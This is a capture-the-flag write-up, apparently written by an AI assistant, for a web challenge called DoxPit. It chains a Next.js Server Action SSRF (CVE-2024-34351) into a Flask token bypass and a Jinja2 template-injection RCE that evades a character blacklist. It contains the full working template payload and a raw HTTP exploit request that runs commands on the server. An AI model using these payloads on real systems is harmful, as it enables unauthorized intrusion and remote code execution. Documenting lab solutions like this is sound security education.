# DoxPit

Congratulations! Successfully chaining an SSRF into a multi-filter-bypass RCE is a top-tier CTF accomplishment. You navigated the "pit" perfectly.

Here is a comprehensive write-up of the **DoxPit** challenge.

---

# CTF Write-up: DoxPit

**Challenge Name:** DoxPit

**Difficulty:** Medium

**Category:** Web / Exploitation

**Core Vulnerabilities:** CVE-2024-34351 (Next.js SSRF), Server-Side Template Injection (SSTI) with Blacklist Bypass.

---

## 1. Reconnaissance & Environment Analysis

The application consists of a **Next.js 14.1.0** frontend and a Python **Flask** backend.

- **Next.js (Port 1337):** The exposed entry point. Version 14.1.0 is specifically vulnerable to a critical SSRF.
- **Flask (Port 3000):** An internal "AV" (Antivirus) service running in the same container, not directly accessible from the internet.

## 2. Phase 1: Gaining Internal Access (SSRF)

The first hurdle was the internal nature of the backend. We exploited **CVE-2024-34351**, a Server-Side Request Forgery vulnerability in Next.js Server Actions.

### The Mechanism

In Next.js 14.1.0, when a Server Action triggers a redirect, the server uses the `Host` header to construct the redirect URL. By manipulating the `Host` header to point to an attacker-controlled server, we forced the Next.js server to fetch internal resources.

### Execution

Using a specialized exploit script that acted as a redirect middleman, we:

1. Sent a POST request to the Next.js server.
2. Spoofed the `Host` header to our redirect server.
3. The redirect server returned a `302` to `http://127.0.0.1:3000/register`.
4. Next.js followed this, allowing us to interact with the internal Flask API.

## 3. Phase 2: Authentication Bypass

The Flask backend used an `auth_middleware` that checked for a session or a `token` in the URL parameters.

1. We used the SSRF to hit the `/register` endpoint: `http://127.0.0.1:3000/register?username=hacker&password=hacker`.
2. The response leaked a unique token: `631e0f6c904a9a5a4dde1d0988052ba1`.
3. By appending `?token=[TOKEN]` to all subsequent SSRF requests, we bypassed the login requirement.

## 4. Phase 3: SSTI Discovery & Filter Bypass

The `/home` route was found to be vulnerable to SSTI because it manually replaced user input into a template string and called `render_template_string()`.

### The Blacklist

The developer implemented a strict blacklist in general.py:

invalid_chars = ["{{", "}}", ".", "_", "[", "]", "\\", "x"]

### The Bypass Strategy

To achieve code execution under these constraints, we employed three advanced Jinja2 bypass techniques:

1. **Tag Bypass:** Since `{{ }}` was blocked, we used `{% print(...) %}` to execute and display the output.
2. **Attribute Access Bypass:** Since `.` and `[]` were blocked, we used the `|attr()` filter (e.g., `request|attr("args")`).
3. **Character/Keyword Bypass:** Since `_` and `x` (specifically used in `\x5f` or `popen`) were blocked, we moved the "dirty" strings into secondary URL parameters. The blacklist only checked the `directory` parameter, not the entire `request.args` object.

## 5. Phase 4: Remote Code Execution (RCE)

We needed to escape the Jinja2 sandbox to access Pythonâ€™s `os` module. We used the global `lipsum` object as our entry point.

### The Final Payload Construction

We mapped forbidden strings to single-letter URL arguments:

- `a=__globals__`, `b=get`, `c=__builtins__`, `d=__import__`, `p=popen`, `r=read`

**The Injection (`directory` parameter):**

Django

`{%print(lipsum|attr(request|attr("args")|attr("get")("a"))|attr(request|attr("args")|attr("get")("b"))(request|attr("args")|attr("get")("c"))|attr(request|attr("args")|attr("get")("b"))(request|attr("args")|attr("get")("d"))("os")|attr(request|attr("args")|attr("get")("p"))(request|attr("args")|attr("get")("cmd"))|attr(request|attr("args")|attr("get")("r"))())%}`

### Flag Retrieval

After confirming RCE with `id`, we used `ls -la /` to find the flag file and `cat` to read it.

Final Request Snippet:

...&p=popen&r=read&cmd=cat+/flag9ee5fa1b9d.txt

---

```python
POST / HTTP/1.1
Host: 158.160.77.40:8000
Content-Length: 279
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Next-Action: 0b0da34c9bad83debaebc8b90e4d5ec7544ca862
Accept-Language: ru-RU,ru;q=0.9
Accept: text/x-component
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryiyBbsAUh7BqPLlJd
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D
Referer: Referer-modified-value
Accept-Encoding: gzip, deflate, br
Origin: http://158.160.77.40:8000
SSRF: http://127.0.0.1:3000/home?token=631e0f6c904a9a5a4dde1d0988052ba1&directory=%7B%25print(lipsum%7Cattr(request%7Cattr(%22args%22)%7Cattr(%22get%22)(%22a%22))%7Cattr(request%7Cattr(%22args%22)%7Cattr(%22get%22)(%22b%22))(request%7Cattr(%22args%22)%7Cattr(%22get%22)(%22c%22))%7Cattr(request%7Cattr(%22args%22)%7Cattr(%22get%22)(%22b%22))(request%7Cattr(%22args%22)%7Cattr(%22get%22)(%22d%22))(%22os%22)%7Cattr(request%7Cattr(%22args%22)%7Cattr(%22get%22)(%22p%22))(request%7Cattr(%22args%22)%7Cattr(%22get%22)(%22cmd%22))%7Cattr(request%7Cattr(%22args%22)%7Cattr(%22get%22)(%22r%22))())%25%7D&a=__globals__&b=get&c=__builtins__&d=__import__&p=popen&r=read&cmd=cat+/flag9ee5fa1b9d.txt
Connection: keep-alive

------WebKitFormBoundaryiyBbsAUh7BqPLlJd
Content-Disposition: form-data; name="1_$ACTION_ID_0b0da34c9bad83debaebc8b90e4d5ec7544ca862"

------WebKitFormBoundaryiyBbsAUh7BqPLlJd
Content-Disposition: form-data; name="0"

["$K1"]
------WebKitFormBoundaryiyBbsAUh7BqPLlJd--

```